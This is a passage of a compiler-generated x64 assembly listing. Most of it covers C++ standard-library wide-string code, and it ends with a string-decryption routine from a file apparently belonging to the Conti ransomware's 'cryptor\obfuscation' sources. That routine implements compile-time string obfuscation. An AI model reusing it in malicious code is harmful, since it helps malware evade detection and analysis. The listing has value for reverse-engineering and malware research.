	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  0018d	48 8b c8	 mov	 rcx, rax
  00190	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  00195	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  00199	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2717 :     }

  0019e	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001a2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData
  001a9	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001ae	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  001b5	48 33 cd	 xor	 rcx, rbp
  001b8	e8 00 00 00 00	 call	 __security_check_cookie
  001bd	48 8d a5 98 01
	00 00		 lea	 rsp, QWORD PTR [rbp+408]
  001c4	5f		 pop	 rdi
  001c5	5d		 pop	 rbp
  001c6	c3		 ret	 0
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
_My_data$ = 8
_Al$ = 40
_Alproxy$ = 72
_Proxy$ = 100
_New_capacity$ = 136
_New_ptr$ = 168
$T6 = 388
$T7 = 420
__$ArrayPad$ = 440
this$ = 480
_Arg$ = 488
_Count$ = 496
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>, COMDAT

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 01
	00 00		 sub	 rsp, 488		; 000001e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 42 00 00 00	 mov	 ecx, 66			; 00000042H
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 08
	02 00 00	 mov	 rcx, QWORD PTR [rsp+520]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 b8 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00053	48 8b 85 e0 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0005a	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0005e	48 8b 8d e0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00065	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  0006a	48 39 85 f0 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00071	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  00073	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00078	48 8b 8d e0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00084	48 89 45 28	 mov	 QWORD PTR _Al$[rbp], rax

; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  00088	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  0008f	48 89 45 48	 mov	 QWORD PTR _Alproxy$[rbp], rax

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00093	4c 8b 45 08	 mov	 r8, QWORD PTR _My_data$[rbp]
  00097	48 8b 55 48	 mov	 rdx, QWORD PTR _Alproxy$[rbp]
  0009b	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  0009f	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  000a4	48 83 bd f0 01
	00 00 07	 cmp	 QWORD PTR _Count$[rbp], 7
  000ac	77 6a		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  000ae	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000b2	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  000b9	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  000bd	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000c1	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);

  000c9	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000cd	4c 8b 85 f0 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  000d4	48 8b 95 e8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  000db	48 8b c8	 mov	 rcx, rax
  000de	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

  000e3	33 c0		 xor	 eax, eax
  000e5	66 89 85 84 01
	00 00		 mov	 WORD PTR $T6[rbp], ax
  000ec	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000f0	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  000f7	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  000fb	48 8d 95 84 01
	00 00		 lea	 rdx, QWORD PTR $T6[rbp]
  00102	48 8b c8	 mov	 rcx, rax
  00105	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  0010a	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  0010e	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  00113	e9 c9 00 00 00	 jmp	 $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  00118	48 8b 8d e0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011f	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00124	4c 8b c0	 mov	 r8, rax
  00127	ba 07 00 00 00	 mov	 edx, 7
  0012c	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  00133	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00138	48 89 85 88 00
	00 00		 mov	 QWORD PTR _New_capacity$[rbp], rax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  0013f	48 8d 95 88 00
	00 00		 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  00146	48 8b 4d 28	 mov	 rcx, QWORD PTR _Al$[rbp]
  0014a	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  0014f	48 89 85 a8 00
	00 00		 mov	 QWORD PTR _New_ptr$[rbp], rax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00156	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0015a	48 8d 95 a8 00
	00 00		 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00161	48 8b c8	 mov	 rcx, rax
  00164	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  00169	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0016d	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  00174	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2704 :         _My_data._Myres  = _New_capacity;

  00178	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0017c	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  00183	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);

  00187	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  0018e	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  00193	4c 8b 85 f0 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  0019a	48 8b 95 e8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  001a1	48 8b c8	 mov	 rcx, rax
  001a4	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

  001a9	33 c0		 xor	 eax, eax
  001ab	66 89 85 a4 01
	00 00		 mov	 WORD PTR $T7[rbp], ax
  001b2	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  001b9	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  001be	48 8b 8d f0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  001c5	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  001c9	48 8d 95 a4 01
	00 00		 lea	 rdx, QWORD PTR $T7[rbp]
  001d0	48 8b c8	 mov	 rcx, rax
  001d3	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);
; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  001d8	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  001dc	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2717 :     }

  001e1	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001e5	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData
  001ec	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001f1	48 8b 8d b8 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  001f8	48 33 cd	 xor	 rcx, rbp
  001fb	e8 00 00 00 00	 call	 __security_check_cookie
  00200	48 8d a5 c8 01
	00 00		 lea	 rsp, QWORD PTR [rbp+456]
  00207	5f		 pop	 rdi
  00208	5d		 pop	 rbp
  00209	c3		 ret	 0
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Convert_size@_K_K@std@@YA_K_K@Z
_TEXT	SEGMENT
_Len$ = 224
??$_Convert_size@_K_K@std@@YA_K_K@Z PROC		; std::_Convert_size<unsigned __int64,unsigned __int64>, COMDAT

; 1112 :     sizeof(_Unsigned_type) <= sizeof(_Size_type)) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1113 :     // convert _Unsigned_type to _Size_type, avoiding truncation
; 1114 :     _STL_INTERNAL_STATIC_ASSERT(_Unsigned_type(-1) > 0);
; 1115 :     _STL_INTERNAL_STATIC_ASSERT(_Size_type(-1) > 0);
; 1116 : 
; 1117 :     if constexpr (sizeof(_Unsigned_type) > sizeof(_Size_type)) {
; 1118 :         if (_Len > (numeric_limits<_Size_type>::max)()) {
; 1119 :             _Xlength_error("size is too long for _Size_type");
; 1120 :         }
; 1121 :     }
; 1122 : 
; 1123 :     return static_cast<_Size_type>(_Len);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Len$[rbp]

; 1124 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Convert_size@_K_K@std@@YA_K_K@Z ENDP		; std::_Convert_size<unsigned __int64,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>, COMDAT

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00023	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002a	e8 00 00 00 00	 call	 ??0?$allocator@_W@std@@QEAA@XZ ; std::allocator<wchar_t>::allocator<wchar_t>
  0002f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00036	48 8b c8	 mov	 rcx, rax
  00039	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  0003e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00045	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
_Val1$ = 240
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >, COMDAT

; 1528 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00023	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00028	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002f	48 8b c8	 mov	 rcx, rax
  00032	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  00037	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00045	5f		 pop	 rdi
  00046	5d		 pop	 rbp
  00047	c3		 ret	 0
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z
_TEXT	SEGMENT
_Left$ = 224
_Right$ = 232
??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z PROC ; std::_Pocca<std::allocator<wchar_t> >, COMDAT

; 1067 : _CONSTEXPR20 void _Pocca(_Alloc& _Left, const _Alloc& _Right) noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1068 :     if constexpr (allocator_traits<_Alloc>::propagate_on_container_copy_assignment::value) {
; 1069 :         _Left = _Right;
; 1070 :     }
; 1071 : }

  00024	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002b	5f		 pop	 rdi
  0002c	5d		 pop	 rbp
  0002d	c3		 ret	 0
??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z ENDP ; std::_Pocca<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z
_TEXT	SEGMENT
_Val$ = 224
??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z PROC ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__7C4A1519_type_traits
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1584 :     return __builtin_addressof(_Val);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Val$[rbp]

; 1585 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z ENDP ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 41	 sub	 eax, 65			; 00000041H
  0002d	6b c0 d8	 imul	 eax, eax, -40		; ffffffffffffffd8H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
